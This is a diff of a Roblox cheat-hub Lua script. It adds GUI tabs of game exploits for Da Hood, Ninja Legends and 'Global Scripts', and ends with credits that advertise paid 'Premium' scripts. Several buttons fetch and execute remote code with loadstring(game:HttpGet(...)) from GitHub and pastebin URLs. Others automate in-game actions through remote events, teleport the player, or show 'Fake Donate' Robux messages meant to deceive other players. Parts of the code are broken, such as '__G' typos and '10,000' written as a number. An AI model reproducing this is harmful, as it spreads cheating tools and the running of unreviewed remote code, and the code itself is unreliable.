-    -- // Hit to account prediction
-    local Hit = ApplyPredictionFormula(AimingSelected.Part)
-    local HitPosition = Hit.Position
 
-    -- //
-    if (CameraMode) then
-        Position = HitPosition
-    else
-        -- // Convert 3d -> 2d
-        local Vector, _ = CurrentCamera:WorldToViewportPoint(HitPosition)
-        local Vector2D = Vector2.new(Vector.X, Vector.Y)
+Tab7:AddButton({
+	Name = "Rayx (Detected & Kinda Safe)",
+	Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/SpaceYes/Lua/Main/DaHood.Lua'))()
+  	end    
+})
 
-        -- // Vars
-        local BeizerLock = DaHoodSettings.BeizerLock
+Tab7:AddButton({
+	Name = "Admin Fly (Need to be in Swag roblox Group)",
+	Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/22kristina/swag/main/admin_fly'))()
+  	end    
+})
 
-        -- //
-        Position = Vector2D
-        BeizerData = {
-            Smoothness = BeizerLock.Smoothness,
-            CurvePoints = BeizerLock.CurvePoints
-        }
-    end
+Tab7:AddButton({
+	Name = "Da Hood Modded & Regular Da Hood Gui",
+	Callback = function()
+        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Rippeed/DaHoodinary/main/chariotsware"))()
+  	end    
+})
 
-    -- // Return
-    return Position, BeizerData
-end
-end)
 
-HoodSection:NewToggle("Fake Macro", "Click CTRL and press this", function(state)
-    if state then
-        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 120
-        game.Players.LocalPlayer.Character.Humanoid.JumpPower = 120
-    else
-        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
-        game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
-    end
-end)
+local Tab8 = Window:MakeTab({
+	Name = "Ninja Legends",
+	Icon = "rbxassetid://11982164035",
+	PremiumOnly = false
+})
 
--- Ninja Legends
-local Ninja = Window:NewTab("Ninja Legends")
-local NinjaSection = Ninja:NewSection("Ninja Legends Script | Best Free Script |")
+local Section = Tab8:AddSection({
+	Name = "Ninja legends script"
+})
 
-NinjaSection:NewToggle("Auto Swing", "Make your player autoswing", function(v)
-    getgenv().autoswing = v
-    while true do
-        if not getgenv().autoswing then return end
-        for _,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
-            if v:FindFirstChild("ninjitsuGain") then
-                game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
-                break
+Tab8:AddButton({
+	Name = "Auto Swing",
+	Callback = function()
+        getgenv().autoswing = v
+        while true do
+            if not getgenv().autoswing then return end
+            for _,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+                if v:FindFirstChild("ninjitsuGain") then
+                    game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
+                    break
+                end
             end
+            local A_1 = "swingKatana"
+            local Event = game:GetService("Players").LocalPlayer.ninjaEvent
+            Event:FireServer(A_1)
+            wait(0.1)
         end
-        local A_1 = "swingKatana"
-        local Event = game:GetService("Players").LocalPlayer.ninjaEvent
-        Event:FireServer(A_1)
-        wait(0.1)
-    end
-end)
+  	end    
+})
 
-NinjaSection:NewToggle("Auto Sell", "Makes your player autosell", function(v)
-    getgenv().autosell = v
-    while true do
-        if getgenv().autoswing == false then return end
-        game:GetService("Workspace").sellAreaCircles["sellAreaCircle16"].circleInner.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
-        wait(0.1)
-        game:GetService("Workspace").sellAreaCircles["sellAreaCircle16"].circleInner.CFrame = CFrame.new(0,0,0)
-        wait(0.1)
-    end
-end)
+Tab8:AddButton({
+	Name = "Auto Sell",
+	Callback = function()
+        getgenv().autosell = v
+        while true do
+            if getgenv().autoswing == false then return end
+            game:GetService("Workspace").sellAreaCircles["sellAreaCircle16"].circleInner.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+            wait(0.1)
+            game:GetService("Workspace").sellAreaCircles["sellAreaCircle16"].circleInner.CFrame = CFrame.new(0,0,0)
+            wait(0.1)
+        end
+  	end    
+})
 
-NinjaSection:NewButton("Unlock all islands", "Unlocks all islands", function()
-    local oldcframe = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
-    for _,v in pairs(game:GetService("Workspace").islandUnlockParts:GetChildren()) do
-        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame
+Tab8:AddButton({
+	Name = "Unlock all islands",
+	Callback = function()
+        local oldcframe = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+        for _,v in pairs(game:GetService("Workspace").islandUnlockParts:GetChildren()) do
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame
+            wait(0.1)
+        end
         wait(0.1)
-    end
-    wait(0.1)
-    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldcframe
-end)
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldcframe
+  	end    
+})
 
-NinjaSection:NewButton("Auto buy all swords", "Auto buys all swords", function(v)
-    getgenv().buyswords = v
+
+Tab8:AddButton({
+	Name = "Auto Buy Swords",
+	Callback = function()
+        getgenv().buyswords = v
     while true do
         if not getgenv().buyswords then return end
         local A_1 = "buyAllSwords"
@@ -445,59 +613,183 @@ NinjaSection:NewButton("Auto buy all swords", "Auto buys all swords", function(v
         Event:FireServer(A_1, A_2)
         wait(0.5)
     end
-end)
-
-NinjaSection:NewButton("Auto buy all belts", "Auto buys all belts", function(v)
-    getgenv().buybelts = v
-    while true do
-        if not getgenv().buybelts then return end
-        local A_1 = "buyAllBelts"
-        local A_2 = "Inner Peace Island"
-        local Event = game:GetService("Players").LocalPlayer.ninjaEvent
-        Event:FireServer(A_1, A_2)
-        wait(0.5)
-    end
-end)
-
--- CommingSoon
-local FXGComming = Window:NewTab("Latest Scripts")
-local FXGCommingSection = FXGComming:NewSection("| Recent Scripts |")
-
-FXGCommingSection:NewButton("Auto buy all belts [NINJA LEGENDS]", "Ninja Legends", function()
-    getgenv().buybelts = v
-    while true do
-        if not getgenv().buybelts then return end
-        local A_1 = "buyAllBelts"
-        local A_2 = "Inner Peace Island"
-        local Event = game:GetService("Players").LocalPlayer.ninjaEvent
-        Event:FireServer(A_1, A_2)
-        wait(0.5)
-    end
-end)
-
-FXGCommingSection:NewButton("Sky Wars GUI", "Regular script", function(state)
-    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/DohmBoyOG/Script-Dump/main/OPSkywarsGUI_NolixXDohmScripts_Public.lua"))()
-end)
-
-local FXGCommingSection = FXGComming:NewSection("No Selection")
-
-local FXGCommingSection = FXGComming:NewSection("No Selection")
-
-local FXGCommingSection = FXGComming:NewSection("No Selection")
-
-local FXGCommingSection = FXGComming:NewSection("No Selection")
-
-local FXGCommingSection = FXGComming:NewSection("No Selection")
-
-local FXGCommingSection = FXGComming:NewSection("No Selection")
-
-local FXGCommingSection = FXGComming:NewSection("No Selection")
-
-local FXGCommingSection = FXGComming:NewSection("No Selection")
-
-local FXGCommingSection = FXGComming:NewSection("No Selection")
+  	end    
+})
 
 
+Tab8:AddButton({
+	Name = "Auto Buy Belts",
+	Callback = function()
+        getgenv().buybelts = v
+        while true do
+            if not getgenv().buybelts then return end
+            local A_1 = "buyAllBelts"
+            local A_2 = "Inner Peace Island"
+            local Event = game:GetService("Players").LocalPlayer.ninjaEvent
+            Event:FireServer(A_1, A_2)
+            wait(0.5)
+        end
+  	end    
+})
+
+local Tab9 = Window:MakeTab({
+	Name = "Global Scripts",
+	Icon = "rbxassetid://10507357657",
+	PremiumOnly = false
+})
+
+local Section = Tab9:AddSection({
+	Name = "All the scripts in this section are GLOBAL"
+})
+local Section = Tab9:AddSection({
+	Name = "*All the scripts in this section are for every game*"
+})
+
+Tab9:AddButton({
+	Name = "Chat Spoofer",
+	Callback = function()
+        loadstring(game:HttpGet(('https://pastebin.com/raw/djBfk8Li'),true))()
+  	end    
+})
+
+Tab9:AddButton({
+	Name = "Fake Donate 100 Robux to Friend",
+	Callback = function()
+        _G.WhoDonated = "You"
+_G.HowMuchRobux = 100
+_G.WhoGotRobux = "Friend"
+_G.SmiteAnimationId = "ID"
+  	end    
+})
+
+Tab9:AddButton({
+	Name = "Fake Donate 1000 Robux to Friend",
+	Callback = function()
+        __G.WhoDonated = "You"
+        _G.HowMuchRobux = 1000
+        _G.WhoGotRobux = "Friend"
+        _G.SmiteAnimationId = "ID"
+  	end    
+})
+
+
+Tab9:AddButton({
+	Name = "Fake Donate 10,000 Robux to Friend",
+	Callback = function()
+        __G.WhoDonated = "You"
+        _G.HowMuchRobux = 10,000
+        _G.WhoGotRobux = "Friend"
+        _G.SmiteAnimationId = "ID"
+  	end    
+})
+
+
+Tab9:AddButton({
+	Name = "Fake Donate 25,000 Robux to Friend",
+	Callback = function()
+        __G.WhoDonated = "You"
+        _G.HowMuchRobux = 25,000
+        _G.WhoGotRobux = "Friend"
+        _G.SmiteAnimationId = "ID"
+  	end    
+})
+
+
+Tab9:AddButton({
+	Name = "Fake Donate 50,000 Robux to Friend",
+	Callback = function()
+        __G.WhoDonated = "You"
+        _G.HowMuchRobux = 50,000
+        _G.WhoGotRobux = "Friend"
+        _G.SmiteAnimationId = "ID"
+  	end    
+})
+
+
+Tab9:AddButton({
+	Name = "Fake Donate 75,000 Robux to Friend",
+	Callback = function()
+        __G.WhoDonated = "You"
+        _G.HowMuchRobux = 75,000
+        _G.WhoGotRobux = "Friend"
+        _G.SmiteAnimationId = "ID"
+  	end    
+})
+
+Tab9:AddButton({
+	Name = "Fake Donate 100,000 Robux to Friend",
+	Callback = function()
+        __G.WhoDonated = "You"
+        _G.HowMuchRobux = 100,000
+        _G.WhoGotRobux = "Friend"
+        _G.SmiteAnimationId = "ID"
+  	end    
+})
+
+
+Tab9:AddButton({
+	Name = "Fake Donate 500,000 Robux to Friend",
+	Callback = function()
+        __G.WhoDonated = "You"
+        _G.HowMuchRobux = 500,000
+        _G.WhoGotRobux = "Friend"
+        _G.SmiteAnimationId = "ID"
+  	end    
+})
+
+
+Tab9:AddButton({
+	Name = "Fake Donate 1,000,000 Robux to Friend",
+	Callback = function()
+        __G.WhoDonated = "You"
+        _G.HowMuchRobux = 1,000,000
+        _G.WhoGotRobux = "Friend"
+        _G.SmiteAnimationId = "ID"
+  	end    
+})
+
+
+Tab9:AddButton({
+	Name = "Fly",
+	Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Nicuse/RobloxScripts/main/BypassedFly.lua"))() 
+
+        OrionLib:MakeNotification({
+            Name = "X Toggle",
+            Content = "Click X to toggle Fly",
+            Image = "rbxassetid://11401835376",
+            Time = 5
+        })
+  	end    
+})
+
+
+Tab9:AddButton({
+	Name = "Korblox Leg (Visual)",
+	Callback = function()
+        local ply = game.Players.LocalPlayer
+    local chr = ply.Character
+     chr.RightLowerLeg.MeshId = "902942093"
+     chr.RightLowerLeg.Transparency = "1"
+     chr.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
+     chr.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
+     chr.RightFoot.MeshId = "902942089"
+     chr.RightFoot.Transparency = "1"
+  	end    
+})
+
+Tab9:AddButton({
+	Name = "Headless Head (Visual)",
+	Callback = function()
+        game.Players.LocalPlayer.Character.Head.Transparency = 1
+        game.Players.LocalPlayer.Character.Head.Transparency = 1
+        for i,v in pairs(game.Players.LocalPlayer.Character.Head:GetChildren()) do
+        if (v:IsA("Decal")) then
+        v.Transparency = 1
+        end
+        end
+  	end    
+})
 
 
 
@@ -507,3 +799,145 @@ local FXGCommingSection = FXGComming:NewSection("No Selection")
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+local CreditzCreator = Window:MakeTab({
+	Name = "Credits",
+	Icon = "rbxassetid://4871684504",
+	PremiumOnly = false
+})
+
+local Section = CreditzCreator:AddSection({
+	Name = "This is a remade script, the original one is still aviable"
+})
+local Section = CreditzCreator:AddSection({
+	Name = "This script has more quality than the other one"
+})
+local Section = CreditzCreator:AddSection({
+	Name = "Everything in this script was made by MoneyMaker#0699"
+})
+local Section = CreditzCreator:AddSection({
+	Name = "No more Personal Premium Page"
+})
+local Section = CreditzCreator:AddSection({
+	Name = "if you have premium you will be able to use the scripts in this one"
+})
+local Section = CreditzCreator:AddSection({
+	Name = "with an special Premium Tab that shows ALL the premium Scripts"
+})
+CreditzCreator:AddParagraph("Would you like to know more:","This script is an Reused script, but with the exact same stuff as the original one, this script only has better graphics and a better quality, more stuff into it and easier for people to understand it better than the main one, this script will probally be used more in the next updates!")
+CreditzCreator:AddParagraph("Would you like to purchase Premium?","if you're interested in buying premium, heres the link: https://www.roblox.com/catalog/11452467150/Premium-Script by purchasing premium you will be able to get special scripts and better performanced scripts, in many popular games, as example adopt me DUPE and adopt me Neon Pets and way more scripts that have an special code into them.")
